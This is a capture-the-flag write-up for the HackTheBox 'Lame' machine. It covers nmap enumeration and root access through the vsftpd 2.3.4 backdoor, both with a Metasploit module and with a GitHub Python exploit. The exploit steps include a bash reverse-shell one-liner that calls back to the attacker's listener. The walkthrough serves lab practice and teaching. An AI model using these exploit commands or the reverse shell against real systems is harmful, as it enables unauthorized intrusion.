# Lame - HackTheBox

![lame](https://miro.medium.com/max/593/1*7Wkk8qE92Mwf1nWWbYS5mA.png)

### Enumeration

#### Nmap

```
nmap -T4 -sC -sV -p- 10.10.10.3

21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.14.8
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
```

Let's check the version of the open services if they are vulnerable.

The `vsftpd 2.3.4` version seems vulnerable.

#### Metasploit

We can use the `exploit/unix/ftp/vsftpd_234_backdoor` module :

```
msf> use exploit/unix/ftp/vsftpd_234_backdoor
msf> set rhosts 10.10.10.3
msf> exploit
```

We are root !

#### Without Metasploit

There is another exploit in Python3 found on github :

```
git clone https://github.com/ahervias77/vsftpd-2.3.4-exploit
```

Start a netcat listener :

```
ns -lnvp 1234
```

We can run the exploit with our reverse shell in parameter :

```
python3 vsftpd_234_exploit.py 10.10.10.3 21 'bash -i >& /dev/tcp/<local_ip>/1234 0>&1'
```

We get our shell back, anf we are root ! We can get the two flags !
